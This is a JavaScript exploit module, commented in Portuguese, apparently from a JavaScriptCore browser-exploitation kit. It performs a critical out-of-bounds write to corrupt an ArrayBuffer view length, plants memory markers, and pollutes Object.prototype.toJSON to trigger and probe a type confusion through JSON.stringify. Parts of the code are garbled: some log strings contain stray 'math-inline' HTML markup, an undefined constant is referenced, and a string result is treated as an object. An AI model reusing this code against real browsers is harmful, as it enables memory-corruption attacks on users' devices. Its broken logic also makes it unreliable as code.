// js/script3/testTypeConfusionExploitation.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute, 
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_V31 = "TypeConfusionExploit_v31_Fix2"; // Atualizado para v31

const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF; 
const VICTIM_AB_SIZE = 64;

// Marcadores dentro de oob_array_buffer_real (usados se 'this' for confundido com oob_array_buffer_real)
const MARKER_AT_OOB_0_OFFSET = 0x0; 
const MARKER_AT_OOB_0_VALUE  = 0xABCDDCBA;
const MARKER_AT_OOB_400_OFFSET = 0x400; 
const MARKER_AT_OOB_400_VALUE  = 0xFEEDBEFF;

// Estrutura fake (apenas para referência de offsets se a Type Confusion direcionar para ela)
const FAKE_VIEW_BASE_OFFSET_IN_OOB    = 0x58;

let tc_probe_results_v31 = null;

// Nova toJSON para o teste v31
function toJSON_ProbeConfusedVictim_v31() {
    const FNAME_toJSON = "toJSON_ProbeConfusedVictim_v31";
    tc_probe_results_v31 = {
        toJSON_executed: FNAME_toJSON,
        this_actual_type: "N/A",
        this_byteLength: "N/A",
        read_marker_1_via_this: "N/A",
        read_marker_2_via_this: "N/A",
        error: null
    };

    try {
        tc_probe_results_v31.this_actual_type = Object.prototype.toString.call(this);
        logS3(`[${FNAME_toJSON}] Chamada! this_actual_type: ${tc_probe_results_v31.this_actual_type}`, "warn");

        if (tc_probe_results_v31.this_actual_type === "[object Object]") {
            logS3(`  !!!! TYPE CONFUSION DETECTADA !!!! 'this' (deveria ser victim_ab) é [object Object]!`, "critical", FNAME_toJSON);
            document.title = `TC DETECTED: ${tc_probe_results_v31.this_actual_type}`;

            try {
                tc_probe_results_v31.this_byteLength = this.byteLength; 
            } catch (e_bl) { tc_probe_results_v31.this_byteLength = `Error: ${e_bl.name}`; }
            logS3(`    [TC] this.byteLength (tentativa): ${tc_probe_results_v31.this_byteLength}`, "leak", FNAME_toJSON);

            // Se 'this' (o victim_ab, agora [object Object]) foi confundido e de alguma forma
            // agora se comporta como uma view sobre oob_array_buffer_real (MUITO especulativo),
            // ou se seus acessos são remapeados para o oob_array_buffer_real.
            if (typeof this.byteLength === 'number' && this.byteLength > OTHER_SID_READ_OFFSET) { // Checagem básica
                logS3(`    [TC] byteLength de 'this' (${this.byteLength}) é grande. Tentando leituras indexadas...`, "info", FNAME_toJSON);
                try {
                    const temp_view_on_this = new Uint32Array(this); // Pode falhar se 'this' não for buffer-like
                    tc_probe_results_v31.read_marker_1_via_this = toHex(temp_view_on_this[MARKER_AT_OOB_0_OFFSET / 4]);
                    tc_probe_results_v31.read_marker_2_via_this = toHex(temp_view_on_this[MARKER_AT_OOB_400_OFFSET / 4]);
                } catch (e_indexed_read) {
                     tc_probe_results_v31.error = (tc_probe_results_v31.error || "") + `IndexedReadFail: ${e_indexed_read.name}; `;
                }
            }

        } else if (tc_probe_results_v31.this_actual_type === "[object ArrayBuffer]") {
            try { tc_probe_results_v31.this_byteLength = this.byteLength; } catch (e) {}
            logS3(`  [${FNAME_toJSON}] 'this' é ArrayBuffer. byteLength: ${tc_probe_results_v31.this_byteLength}`, "info", FNAME_toJSON);
        }
    } catch (e_main) {
        tc_probe_results_v31.error = (tc_probe_results_v31.error || "") + `General toJSON Error: ${e_main.name}: ${e_main.message};`;
    }
    return tc_probe_results_v31;
}

export async function executeReplicateAndExploitTCTest_v31() { 
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V31}.replicateAndExploitTC`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Replicando TC de v26 e Tentando Exploração (FixRef) ---`, "test", FNAME_CURRENT_TEST);
    document.title = `ReplicateTC_v31_FixRef`;

    tc_probe_results_v31 = null;
    let errorCapturedMain = null;
    let stringifyOutput = null;
    let potentiallyCrashed = true; 
    let lastStep = "init";

    const mLengthOffsetFromConfig = parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);
    if (isNaN(mLengthOffsetFromConfig)) {
        logS3("ERRO CRÍTICO: JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET não é um número válido.", "critical", FNAME_CURRENT_TEST);
        return { errorOccurred: new Error("Invalid M_LENGTH_OFFSET"), potentiallyCrashed: false, stringifyResult: null, toJSON_details: null };
    }
    const corruptionTargetOffsetInOOBAB = FAKE_VIEW_BASE_OFFSET_IN_OOB + mLengthOffsetFromConfig; 

    try {
        lastStep = "oob_setup";
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`   Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST);

        // PASSO 1: Plantar marcadores no oob_array_buffer_real (Não plantar a estrutura fake completa aqui para replicar v26)
        lastStep = "plant_markers";
        oob_write_absolute(MARKER_AT_OOB_0_OFFSET, MARKER_AT_OOB_0_VALUE, 4);
        oob_write_absolute(MARKER_AT_OOB_400_OFFSET, MARKER_AT_OOB_400_VALUE, 4);
        logS3(`PASSO 1: Marcadores plantados em oob_ab: <span class="math-inline">\{toHex\(MARKER\_AT\_OOB\_0\_VALUE\)\} @</span>{toHex(MARKER_AT_OOB_0_OFFSET)}, <span class="math-inline">\{toHex\(MARKER\_AT\_OOB\_400\_VALUE\)\} @</span>{toHex(MARKER_AT_OOB_400_OFFSET)}`, "info", FNAME_CURRENT_TEST);

        // PASSO 2: Escrita OOB CRÍTICA em oob_array_buffer_real[corruptionTargetOffsetInOOBAB]
        lastStep = "critical_oob_write";
        logS3(`PASSO 2: Escrevendo valor CRÍTICO <span class="math-inline">\{toHex\(CRITICAL\_OOB\_WRITE\_VALUE\)\} em oob\_array\_buffer\_real\[</span>{toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);

        await PAUSE_S3(100);

        lastStep = "victim_creation_and_stringify";
        let victim_ab = new ArrayBuffer(VICTIM_AB_SIZE);
        logS3(`PASSO 3: victim_ab (${VICTIM_AB_SIZE} bytes) criado. Tentando JSON.stringify(victim_ab) com ${toJSON_ProbeConfusedVictim_v31.name}...`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_ProbeConfusedVictim_v31, // CORREÇÃO AQUI
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab)... (Ponto de teste da Type Confusion)`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab); 
            potentiallyCrashed = false; 

            logS3(`  JSON.stringify(victim_ab) completou. Detalhes da toJSON: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (stringifyOutput) {
                if (stringifyOutput.error) {
                    logS3(`    ERRO DENTRO da toJSON: ${stringifyOutput.error}`, "error", FNAME_CURRENT_TEST);
                    errorCapturedMain = new Error(stringifyOutput.error);
                }
                if (stringifyOutput.this_actual_type === "[object Object]") {
                    logS3("    !!!! TYPE CONFUSION REPLICADA !!!! 'this' na toJSON (de victim_ab) é [object Object]!", "critical", FNAME_CURRENT_TEST);
                    document.title = `TC REPLICATED: ${stringifyOutput.this_actual_type}`;
                    logS3(`      Leitura de this.byteLength: ${stringifyOutput.read_this_byteLength}`, "leak", FNAME_CURRENT_TEST);
                    logS3(`      Leitura de Marcador @${toHex(MARKER_AT_OOB_0_OFFSET)} via this[...]: ${stringifyOutput.read_marker_1_via_this} (Esperado: ${toHex(MARKER_AT_OOB_0_VALUE)})`, "leak", FNAME_CURRENT_TEST);
                    logS3(`      Leitura de Marcador @${toHex(MARKER_AT_OOB_400_OFFSET)} via this[...]: ${stringifyOutput.read_marker_2_via_this} (Esperado: ${toHex(MARKER_AT_OOB_400_VALUE)})`, "leak", FNAME_CURRENT_TEST);

                    if (stringifyOutput.read_marker_1_via_this === toHex(MARKER_AT_OOB_0_VALUE) || 
                        stringifyOutput.read_marker_2_via_this === toHex(MARKER_AT_OOB_400_VALUE)) {
                        document.title = "SUCCESS: TC LEADS TO READ!";
                    }
                }
            }
        } catch (e_str) {
            errorCapturedMain = e_str;
            potentiallyCrashed = false; 
            lastStep = "error_in_stringify";
            logS3(`   ERRO CRÍTICO durante JSON.stringify(victim_ab): ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `TC Exploit CRASH: ${e_str.name}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        potentiallyCrashed = false; 
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V31} FALHOU: ${e_outer_main.name}`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} (Último passo: ${lastStep}) Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed, 
        stringifyResult: stringifyOutput, 
        toJSON_details: tc_probe_results_v31 
    };
}
